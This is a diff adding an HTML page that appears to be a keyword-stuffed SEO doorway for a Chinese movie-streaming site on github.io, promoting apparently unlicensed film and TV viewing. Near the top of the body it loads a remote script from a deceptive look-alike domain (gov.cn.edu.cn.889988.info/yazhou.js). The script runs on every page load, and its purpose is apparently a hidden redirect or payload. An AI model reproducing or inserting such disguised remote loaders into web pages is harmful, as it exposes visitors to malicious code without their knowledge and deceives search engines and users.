@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>爱上电影网 - 高清影视资源第一站 | aishangdianyingwang-app.github.io</title>
+<meta name="description" content="爱上电影网提供最新高清电影、电视剧、综艺在线观看。爱上电影网是影迷首选平台，访问 https://aishangdianyingwang-app.github.io 畅享海量影视资源。">
+<meta name="keywords" content="爱上电影网, 电影, 电视剧, 综艺, 高清影视, aishangdianyingwang-app.github.io">
+<meta name="author" content="爱上电影网">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://aishangdianyingwang-app.github.io">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{
+  font-family:'Segoe UI','PingFang SC',sans-serif;
+  background:#0a0a0f;
+  color:#e0e0e0;
+  line-height:1.6;
+  overflow-x:hidden;
+}
+a{color:#00f0ff;text-decoration:none;transition:all .3s;}
+a:hover{color:#ff00ff;text-shadow:0 0 8px #ff00ff;}
+
+/* 导航 */
+.nav{
+  position:fixed;top:0;width:100%;z-index:1000;
+  background:rgba(10,10,15,0.85);
+  backdrop-filter:blur(12px);
+  border-bottom:1px solid rgba(0,240,255,0.2);
+}
+.nav-inner{
+  max-width:1200px;margin:0 auto;
+  display:flex;justify-content:space-between;align-items:center;
+  padding:15px 20px;
+}
+.logo{
+  font-size:1.8rem;font-weight:900;
+  background:linear-gradient(45deg,#00f0ff,#ff00ff);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+}
+.nav-links{display:flex;gap:25px;}
+.nav-links a{
+  font-weight:600;font-size:0.95rem;
+  padding:6px 12px;border-radius:20px;
+}
+.nav-links a:hover{background:rgba(0,240,255,0.1);}
+
+/* 英雄区 */
+.hero{
+  height:100vh;
+  display:flex;align-items:center;justify-content:center;
+  text-align:center;
+  background:radial-gradient(circle at 50% 50%,rgba(255,0,255,0.1),transparent 70%);
+  padding-top:80px;
+}
+.hero h1{
+  font-size:clamp(2.5rem,6vw,4.5rem);
+  font-weight:900;margin-bottom:20px;
+  text-shadow:0 0 20px rgba(0,240,255,0.5);
+}
+.hero p{
+  font-size:1.2rem;max-width:600px;margin:0 auto 30px;
+  color:#aaa;
+}
+.btn{
+  display:inline-block;padding:14px 40px;
+  background:linear-gradient(45deg,#00f0ff,#ff00ff);
+  color:#fff;border-radius:30px;font-weight:700;
+  box-shadow:0 0 20px rgba(0,240,255,0.4);
+}
+
+/* 通用栏目 */
+.section{
+  padding:80px 20px;
+  max-width:1200px;margin:0 auto;
+}
+.section-title{
+  text-align:center;font-size:2.2rem;margin-bottom:50px;
+  position:relative;
+}
+.section-title::after{
+  content:'';display:block;width:80px;height:3px;
+  background:linear-gradient(90deg,#00f0ff,#ff00ff);
+  margin:15px auto;
+}
+
+/* 卡片网格 */
+.grid{
+  display:grid;
+  grid-template-columns:repeat(auto-fit,minmax(280px,1fr));
+  gap:30px;
+}
+.card{
+  background:rgba(255,255,255,0.03);
+  border:1px solid rgba(0,240,255,0.15);
+  border-radius:16px;
+  padding:30px;
+  backdrop-filter:blur(10px);
+  transition:transform .3s,box-shadow .3s;
+}
+.card:hover{
+  transform:translateY(-5px);
+  box-shadow:0 10px 30px rgba(255,0,255,0.2);
+}
+.card h3{color:#00f0ff;margin-bottom:15px;font-size:1.3rem;}
+.card p{color:#bbb;font-size:0.95rem;}
+
+/* 片单列表 */
+.movie-list{
+  list-style:none;
+  display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));
+  gap:20px;
+}
+.movie-item{
+  background:rgba(255,255,255,0.02);
+  border:1px solid rgba(255,0,255,0.2);
+  border-radius:12px;padding:20px;text-align:center;
+}
+.movie-item h4{color:#ff00ff;margin-bottom:8px;}
+
+/* 关于 */
+.about-text{text-align:center;max-width:800px;margin:0 auto;font-size:1.1rem;color:#ccc;}
+
+/* 底部 */
+.footer{
+  text-align:center;padding:40px 20px;
+  border-top:1px solid rgba(0,240,255,0.1);
+  color:#666;font-size:0.9rem;
+}
+
+/* 移动端 */
+@media(max-width:768px){
+  .nav-links{gap:12px;flex-wrap:wrap;justify-content:center;}
+  .nav-inner{flex-direction:column;gap:10px;}
+  .hero h1{font-size:2.2rem;}
+  .section{padding:60px 15px;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<!-- 导航 -->
+<nav class="nav">
+  <div class="nav-inner">
+    <div class="logo">爱上电影网</div>
+    <div class="nav-links">
+      <a href="#home">首页</a>
+      <a href="#movies">电影库</a>
+      <a href="#tv">电视剧</a>
+      <a href="#about">关于我们</a>
+    </div>
+  </div>
+</nav>
+
+<!-- 首页 -->
+<section class="hero" id="home">
+  <div>
+    <h1>爱上电影网</h1>
+    <p>你的专属高清影视乐园 · 访问 <strong>https://aishangdianyingwang-app.github.io</strong> 开启观影之旅</p>
+    <a href="#movies" class="btn">立即探索</a>
+  </div>
+</section>
+
+<!-- 电影库 -->
+<section class="section" id="movies">
+  <h2 class="section-title">🎬 电影库</h2>
+  <div class="grid">
+    <div class="card">
+      <h3>最新院线大片</h3>
+      <p>爱上电影网每日更新好莱坞、国产热门电影，支持超清在线播放。</p>
+      <a href="#">查看详情 »</a>
+    </div>
+    <div class="card">
+      <h3>经典老片修复</h3>
+      <p>精选影史经典，高清修复版重温感动瞬间。</p>
+      <a href="#">查看详情 »</a>
+    </div>
+    <div class="card">
+      <h3>独立电影精选</h3>
+      <p>小众高分独立电影，发现不一样的影像表达。</p>
+      <a href="#">查看详情 »</a>
+    </div>
+  </div>
+</section>
+
+<!-- 电视剧 -->
+<section class="section" id="tv">
+  <h2 class="section-title">📺 热播剧集</h2>
+  <ul class="movie-list">
+    <li class="movie-item"><h4>国产热剧</h4><p>同步更新热门国产剧集</p><a href="#">观看 #</a></li>
+    <li class="movie-item"><h4>美剧专区</h4><p>全网最新美剧资源</p><a href="#">观看 #</a></li>
+    <li class="movie-item"><h4>韩剧综艺</h4><p>韩流全覆盖</p><a href="#">观看 #</a></li>
+    <li class="movie-item"><h4>日剧动漫</h4><p>日本影视动漫合集</p><a href="#">观看 #</a></li>
+  </ul>
+</section>
+
+<!-- 关于 -->
+<section class="section" id="about">
+  <h2 class="section-title">🎞️ 关于爱上电影网</h2>
+  <p class="about-text">
+    <strong>爱上电影网</strong>（网址：<a href="https://aishangdianyingwang-app.github.io">https://aishangdianyingwang-app.github.io</a>）是一个专注于高清影视资源分享的平台。
+    我们致力于为影迷提供最新、最全的电影、电视剧、综艺节目在线观看服务。爱上电影网，让每一部好电影都不被错过。
+  </p>
+</section>
+
+<!-- 底部 -->
+<footer class="footer">
+  <p>© 2025 爱上电影网 | 网址：https://aishangdianyingwang-app.github.io</p>
+  <p>关键词：爱上电影网 · 高清影视 · 在线观看</p>
+</footer>
+
+</body>
+</html>
